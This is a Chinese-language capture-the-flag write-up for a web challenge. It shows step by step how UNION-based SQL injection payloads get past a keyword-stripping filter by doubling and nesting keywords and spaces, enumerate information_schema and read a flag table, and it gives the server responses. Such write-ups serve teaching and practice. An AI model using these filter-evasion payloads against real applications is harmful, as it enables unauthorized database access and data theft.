# 题目

通过注入获得flag值（提交格式：flag{}）。

解题链接： [http://ctf5.shiyanbar.com/423/web/](http://ctf5.shiyanbar.com/423/web/)

# writeup

参考：http://hebin.me/2017/09/06/%E8%A5%BF%E6%99%AEctf-%E7%AE%80%E5%8D%95%E7%9A%84sql%E6%B3%A8%E5%85%A5/

## 步骤

首先，爆出表名：

```shell
1'  unionunion  selectselect  table_name  fromfrom  information_schema.tables  wherewhere  '1'='1
```

再爆出列名：

```shell
1' unionunion  selectselect  column_namcolumn_namee  fromfrom  information_schema.coluinformation_schema.columnsmns  wherewhere  table_name='flag
```

再直接看值：

```shell
1'  unionunion  selectselect  flag  fromfrom  flag  wherewhere  '1'='1
```

## 探究

1.  输入数值1返回结果：

```shell
ID: 1
name: baloteli
```

在输入1'(注意输入法)：

```shell
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1''' at line 1
```

可见输入的是字符串类型，并且存在注入点。

2.  由于题目问过滤了什么，干脆将几个关键字一起写出来，输入如下语句：

```shell
1 and or # --  union select from where
```

```shell
ID: 1 or    where
name: baloteli
```

从id项看出有几个已经被过滤掉了，而且是直接把关键字给去掉，那么可以用类似ab(abc)c来绕过过滤，abc是要绕过的关键字，使用时不加括号，这里加括号只是为了区分.

3.  开始爆表名，在之前应该先猜解union需要的列数，我直接猜的1列：

```shell
1' ununionion seselectlect 1 frofromm information_schema.tables where '1'='1
```

```shell
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'ununionion seselectlect 1 frofromm information_schema.tables '1'='1'' at line 1
```

尴尬了。。几个关键字竟然没有成功绕过，猜想过滤时应该是从单词开始进行匹配的，那么可以尝试将两个同样的关键字首尾连起来测试，并且从返回结果还可以看到where关键字被过滤了（不知道为什么第一步中没被过滤）。

```shell
1' unionunion selectselect table_name fromfrom information_schema.tables wherewhere '1'='1
```

```shell
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'unionselecttable_name frominformation_schema.tables where'1'='1'' at line 1
```

又报错了，但是可以发现几个关键字已经绕过过滤了，但是他们却连在了一起，可能空格已被过滤了，再试试

```shell
1'  unionunion  selectselect  table_name  fromfrom  information_schema.tables  wherewhere  '1'='1
```

就是用两个空格代替一个，方法和关键字一样。然后直接返回一大堆结果，可以发现一个特殊的表名

```shell
ID: 1'  union select table_name  from information_schema.tables  where '1'='1
name: flag
```

4.  爆出列名：

```shell
1'  unionunion  selectselect  column_name  fromfrom  information_schema.columns  wherewhere  table_name='flag
```

```shell
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'from   where table_name='flag'' at line 1
```

`information_schema.columns` 跑哪了？估计被过滤了

```shell
1'  unionunion  selectselect  column_name  fromfrom  information_schema.columnsinformation_schema.columns  wherewhere  table_name='flag
```

结果仍然是刚才的错误警告，不知道后台怎么过滤的，再换一种ab（abc）c形式的过滤

```shell
1' unionunion  selectselect  column_name  fromfrom information_schema.coluinformation_schema.columnsmns  wherewhere  table_name='flag
```

```shell
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'where table_name='flag'' at line 1
```

这下有点懵了，这会是什么错误？想了半天，可能是把column_name也给过滤了吧：

```shell
1' unionunion  selectselect  column_namcolumn_namee  fromfrom  information_schema.coluinformation_schema.columnsmns  wherewhere  table_name='flag
```

```shell
ID: 1' union select column_name  from information_schema.columns  where table_name='flag
name: baloteli

ID: 1' union select column_name  from information_schema.columns  where table_name='flag
name: flag

ID: 1' union select column_name  from information_schema.columns  where table_name='flag
name: id
```

找到特殊列flag

5.  直接查询flag：

```shell
1'  unionunion  selectselect  flag  fromfrom  flag  wherewhere  '1'='1
```

```shell
ID: 1'  union select flag  from flag  where '1'='1
name: baloteli

ID: 1'  union select flag  from flag  where '1'='1
name: flag{******}
```